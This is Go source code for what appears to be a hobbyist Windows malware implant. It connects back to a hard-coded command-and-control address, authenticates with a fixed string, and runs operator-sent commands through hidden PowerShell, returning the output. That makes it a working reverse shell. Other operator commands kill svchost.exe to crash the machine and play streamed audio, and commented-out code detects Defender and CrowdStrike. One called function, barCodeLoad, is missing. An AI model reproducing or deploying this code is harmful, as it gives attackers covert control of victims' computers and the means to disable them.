package main

import (
	"bytes"
	"fmt"
	"net"
	"os"
	"os/exec"
	"syscall"
	"time"

	//"github.com/MarinX/keylogger"

	"github.com/ebitengine/oto/v3"
	"github.com/hajimehoshi/go-mp3"
)

func callHome(c2Address *string, attempts *int) (net.Conn, bool) {
	if *attempts > 3 {
		terminate()
	}
	addr, err := net.Dial("tcp", *c2Address)
	if err != nil {
		fmt.Println("Couldn't establish a connection")
		*attempts = *attempts + 1
		time.Sleep(10 * time.Second)
		return addr, false
	}
	reply2Auth(&addr)
	*attempts = 0
	return addr, true
}

func reply2Auth(conn *net.Conn) {
	(*conn).Write([]byte("i_L0V_y0U_Ju5t1n_P3t3R\n"))
}

func listen4Commands(conn *net.Conn) string {
	request := make([]byte, 9000)
	read_len, err := (*conn).Read(request)
	if read_len == 0 {
		os.Exit(0)
	}
	if err != nil {
		os.Exit(0)
	}
	command := string(request[:read_len])
	return command
}

func executeCommands(conn *net.Conn, command *string) {
	if *command == "stop\n" {
		terminate()
	}
	powershellPath := "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
	ps_instance := exec.Command(powershellPath, "/c", *command)
	ps_instance.SysProcAttr = &syscall.SysProcAttr{HideWindow: true} //Learn how syscalls work ktiir 2awiyeh
	output, err := ps_instance.Output()
	if err != nil {
		output = []byte("Couldn't execute the command\n")
		fmt.Println("Couldnt Execute the command")
	}
	(*conn).Write(output)
}

// func checkSec() []string {
// 	products := []string{}
// 	procs, err := process.GetProcesses()
// 	if err != nil {
// 		fmt.Println("Couldn't Get Processes")
// 	}
// 	for index := range procs {
// 		if procs[index].Exe == "MsMpEng.exe" {
// 			products = append(products, "Defender")
// 		}
// 		if procs[index].Exe == "CSFalconService.exe" {
// 			products = append(products, "CrowdStrike")
// 		}
// 	}
// 	return products
// }

func terminate() {
	fmt.Println("Terminating Implant")
	time.Sleep(1 * time.Second)
	os.Exit(0)
}

// func cd(conn *net.Conn, command *string, pImplantWD *string) bool {
// 	regexCD := regexp.MustCompile(`cd\s+.+`)
// 	matchCD := regexCD.FindString(*command)
// 	if matchCD != "" {
// 		dir2go := strings.Split(matchCD, " ")[1]
// 		// implantWD := os.Chdir(dir2go)
// 		if os.Chdir(dir2go) != nil {
// 			(*conn).Write([]byte("Error getting the dir\n"))
// 		} else {
// 			*pImplantWD, _ = os.Getwd()
// 		}
// 		return true
// 	}
// 	return false
// }

// func ls(conn *net.Conn, implantWD *string) {
// 	dirFS, _ := os.ReadDir(*implantWD)
// 	dirListing := ""
// 	for e := range dirFS {
// 		dirInfo, _ := dirFS[e].Info()
// 		dirListing = dirListing + "		" + fmt.Sprint(dirInfo.Size()) + "		" + fmt.Sprint(dirInfo.Mode()) + "		" + dirInfo.Name() + "\n"
// 	}
// 	(*conn).Write([]byte("\n" + "		SIZE		" + "MODE		" + "	NAME" + "\n" +
// 		"		----		" + "----		" + "	----" + "\n" +
// 		dirListing + "\n")) //Looks funky but I want it organized
// }

func receiveNPlayAudio(conn *net.Conn) { //Needs some fixing
	fmt.Println("Recieveing Audio ...")
	music := make([]byte, 3145728) //Track limit is 3MB
	read_len, err := (*conn).Read(music)
	if err != nil {
		fmt.Println("Couldnt Play the Track")
		return
	}
	if read_len < 1 {
		fmt.Println("Couldnt Play the Track")
		return
	}
	musicCut := music[:read_len]
	musicBytesReader := bytes.NewReader(musicCut)
	decodedMp3, err := mp3.NewDecoder(musicBytesReader)
	if err != nil {
		fmt.Println("Audio Decoding Failed")
		return
	}
	op := &oto.NewContextOptions{}
	op.SampleRate = 44100
	op.ChannelCount = 1
	op.Format = oto.FormatSignedInt16LE
	otoCtx, readyChan, err := oto.NewContext(op)
	if err != nil {
		fmt.Println("oto New Context failed")
		return
	}
	<-readyChan
	player := otoCtx.NewPlayer(decodedMp3)
	player.Play()
	//The play is async so we can comment out the below line if we want regulat execution even after returning
	// for player.IsPlaying() {
	// 	time.Sleep(5 * time.Second)
	// }
	err = player.Close()
}

func main() {
	c2Address := "192.168.5.222:1234"
	attempts := 0
	//implantWD, _ := os.Getwd()
	fmt.Println("Implant Started")
	conn, result := callHome(&c2Address, &attempts)
	// if !result {
	// 	fmt.Println("Couldn't call home")
	// 	os.Exit(0)
	// }
	for !result {
		conn, result = callHome(&c2Address, &attempts)
	}
	for { //Main Program Loop
		command := listen4Commands(&conn)
		fmt.Println(command)
		switch command {
		case "AreYouAlive\n":
			reply2Auth(&conn)
		case "SelfDestruct\n": //This only works if it has admin privs. It is the BSOD.
			{
				ps_instance := exec.Command("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "/c", "taskkill.exe", "/f", "/im", "svchost.exe")
				ps_instance.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
				output, err := ps_instance.Output()
				if err != nil {
					fmt.Println("Couldnt Execute the command")
				}
				fmt.Println(output)
				conn.Write([]byte("NoTime2Die\n"))
			}
		case "play\n":
			{
				receiveNPlayAudio(&conn) //Needs time 2 fix
			}
		case "barCode\n":
			{
				barCodeLoad(&conn)
			}
		case "butterInjection\n":
			{
				fmt.Println("Chicken Kiev")
			}
		default: //TO-DO: turning the default into an error statement and appending all shell commands with a ">.<" to avoid crashes
			executeCommands(&conn, &command)
		}
	}
}
